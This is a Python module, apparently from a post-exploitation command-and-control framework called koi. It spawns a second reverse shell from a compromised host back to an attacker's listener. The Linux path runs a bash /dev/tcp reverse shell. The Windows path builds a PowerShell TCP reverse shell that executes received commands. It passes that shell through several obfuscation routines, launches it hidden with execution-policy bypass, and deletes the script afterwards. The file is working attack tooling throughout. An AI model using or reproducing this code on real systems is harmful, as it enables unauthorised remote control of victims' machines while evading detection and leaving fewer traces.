from __future__ import annotations

from koi.modules.blueprint import KoiModule
from koi.utils.config import CONFIG, TIMEOUTS
from koi.utils.payloads import get_interfaces
from koi.utils.ui import yesno
from koi.utils.ps_obfuscate import (
    _ps_syntax_obfuscate,
    _ps_format_obfuscate,
    _ps_variable_obfuscate,
)


class DuplicateModule(KoiModule):
    name        = "duplicate"
    description = "Create a new reverse shell from this session back to the listener"
    category    = "Session"
    platform    = ["linux", "windows_ps"]
    usage       = "duplicate <id> [-i IFACE] [-p PORT]"
    arguments   = [
        {"flags": ["-i", "--iface"], "default": None, "metavar": "IFACE",
         "help": "Network interface to use (default: wlan0 with confirmation)"},
        {"flags": ["-p", "--port"], "type": int, "default": CONFIG["port"], "metavar": "PORT",
         "help": f"Listener port (default: {CONFIG['port']})"},
    ]

    def run(self) -> None:
        if self.session.os_type == "linux":
            self._run_linux()
        else:
            self._run_windows()

    def _select_interface(self) -> tuple[str, int] | None:
        """Resolve (lhost, lport) from args, prompting for the interface if none
        was given. Returns None if there are no interfaces or the user cancels."""
        ifaces = get_interfaces()

        if not ifaces:
            self.err("No local network interfaces found. Make sure the 'ip' command is available on this machine.")
            return None

        iface_arg = getattr(self.args, "iface", None)
        port_arg = getattr(self.args, "port", CONFIG["port"])

        if iface_arg:
            if iface_arg not in ifaces:
                self.err(f"Interface '{iface_arg}' not found. Available: {', '.join(ifaces.keys())}")
                return None
            iface = iface_arg
        else:
            default_iface = "wlan0" if "wlan0" in ifaces else next(iter(ifaces))
            try:
                if not yesno(f"No interface specified, use '{default_iface}'?", prechosen=False):
                    self.status("Cancelled.")
                    return None
            except KeyboardInterrupt:
                self.status("Cancelled.")
                return None
            iface = default_iface

        return ifaces[iface], port_arg

    def _run_linux(self) -> None:
        sel = self._select_interface()
        if sel is None:
            return
        lhost, lport = sel

        with self.spinner(f"Spawning reverse shell to {lhost}:{lport}..."):
            cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &"
            result = self.exec(cmd, timeout=TIMEOUTS["exec_command"])

        if result.returncode == 0:
            self.success(f"Reverse shell spawned to {lhost}:{lport}")
            self.ok("New session should appear shortly on the listener.")
        else:
            self.warn(f"Command exit code: {result.returncode}")
            if result.stdout:
                self.status(f"Output: {result.stdout}")

    def _run_windows(self) -> None:
        sel = self._select_interface()
        if sel is None:
            return
        lhost, lport = sel

        ps_payload = f"""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=New-Object byte[] 65536;while(($i=$s.Read($b,0,65536)) -gt 0){{$d=[System.Text.Encoding]::ASCII.GetString($b,0,$i);try{{$o=iex $d 2>&1|Out-String}}catch{{$o=$_|Out-String}};$p=$o+'PS> ';$e=[System.Text.Encoding]::ASCII.GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()}};$c.Close()"""

        ps_payload = _ps_variable_obfuscate(ps_payload)
        ps_payload = _ps_format_obfuscate(ps_payload)
        ps_payload = _ps_syntax_obfuscate(ps_payload)

        ps_file = f"ps_{hash(ps_payload) & 0x7FFFFFFF}.ps1"

        self.status("Uploading reverse shell payload...")
        ok = self._upload_bytes(ps_payload.encode('utf-8'), f".\\{ps_file}")

        if not ok:
            self.err("Failed to upload payload")
            return

        self.status(f"Spawning reverse shell to {lhost}:{lport}...")
        self._dispatch_ps(
            f"Start-Process powershell -ArgumentList '-nop','-ep','bypass','-File','.\\{ps_file}' -WindowStyle Hidden;"
            f"Start-Sleep -Milliseconds 1500;"
            f"Remove-Item '.\\{ps_file}' -Force -EA SilentlyContinue"
        )

        self.success(f"Reverse shell spawned to {lhost}:{lport}")
        self.ok("New session should appear shortly on the listener.")
